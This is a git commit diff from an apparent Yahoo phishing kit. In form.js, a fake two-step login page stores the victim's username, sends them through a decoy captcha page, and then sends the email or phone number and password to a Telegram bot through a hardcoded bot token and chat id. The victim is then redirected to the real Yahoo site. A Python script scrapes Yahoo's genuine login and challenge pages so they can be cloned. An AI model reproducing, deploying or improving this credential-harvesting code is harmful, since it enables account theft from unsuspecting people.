636164ec28c22a25f6e539aeb3585a4cec168133
Ettouzany <96982820+JamesShell@users.noreply.github.com>
2023-10-17 18:23:02 +0100

    commit

--- assets/js/form.js
+++ assets/js/form.js
@@ -1,40 +1,61 @@
-const form = document.querySelector('#login-username-form');
+const usernameForm = document.querySelector('#login-username-form');
+const passwordForm = document.querySelector('#login-password-form');
 
-form.addEventListener('submit', (e) => {
-    e.preventDefault();
-
-    const text1 = document.getElementById("login-username").value;
-    const text2 = document.getElementById("passwd").value;
-    const countryNum = document.getElementById("selected-country-code");
-    const isEmail = countryNum.parentElement.classList.contains("hide");
-
-    const msg = isEmail?
-        `
-        **Yahoo**
-        Email: ${text1}
-        Password: ${text2}
-        `
-        :
-        `
-        **Yahoo**
-        Phone: ${countryNum.innerText+text1}
-        Password: ${text2}
-        `
-
-    const token = "6674814591:AAE0L5i7a0fA6MrKNVprhDV4c7r4ryr3U9U";
-    const chat_id = "-1001974405857";
-    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`;
-
-    const api = new XMLHttpRequest()
-    api.open("GET", url, true)
-    api.send()
-    // check if it's sent correctly
-    api.onreadystatechange = function() {
-        if (this.readyState == 4 && this.status == 200) {
-            window.location.href = "https://fr.yahoo.com/";
-        }
-    }
+if(usernameForm) {
+    usernameForm.addEventListener('submit', (e) => {
+        e.preventDefault();
     
+        const text1 = document.getElementById("login-username").value;
+        const countryNum = document.getElementById("selected-country-code");
+        const isEmail = countryNum.parentElement.classList.contains("hide");
+    
+        const username = isEmail ? text1 : countryNum.innerText+text1;
+        localStorage.setItem("username", username);
+        localStorage.setItem("isEmail", isEmail ? 1 : 0);
+        
+        window.location.href = "/captcha.html";
+    })
+}
 
-    console.log('sent!')
-})
+if(passwordForm) {
+    const email = document.querySelector('#email');
+    const username = localStorage.getItem("username");
+    email.innerText = username;
+
+    passwordForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+    
+        const isEmail = localStorage.getItem("isEmail") == 1;
+        const password = document.getElementById("login-password").value;
+    
+        const msg = isEmail?
+            `
+            **Yahoo**
+            Email: ${username}
+            Password: ${password}
+            `
+            :
+            `
+            **Yahoo**
+            Phone: ${username}
+            Password: ${password}
+            `
+    
+        const token = "6674814591:AAE0L5i7a0fA6MrKNVprhDV4c7r4ryr3U9U";
+        const chat_id = "-1001974405857";
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`;
+    
+        const api = new XMLHttpRequest()
+        api.open("GET", url, true)
+        api.send()
+        // check if it's sent correctly
+        api.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                window.location.href = "https://fr.yahoo.com/";
+            }
+        }
+    
+        console.log('sent!')
+    })
+}
+
--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 import requests
 
 # Replace this URL with the one you want to fetch data from
-url = "https://login.yahoo.com/?&lang=fr"
+url = "https://login.yahoo.com/account/challenge/email-verify?.lang=fr-FR&done=https%3A%2F%2Fwww.yahoo.com%2F&acrumb=02QuV9ka&display=login&authMechanism=primary&sessionIndex=QQ--"
 
 # Send an HTTP GET request to the URL
 response = requests.get(url)
@@ -9,7 +9,7 @@ response = requests.get(url)
 # Check if the request was successful (status code 200)
 if response.status_code == 200:
     # Save the HTML content to a file named "data.html"
-    with open("data.html", "w", encoding="utf-8") as file:
+    with open("password.html", "w", encoding="utf-8") as file:
         file.write(response.text)
     print("HTML data has been saved to data.html.")
 else:
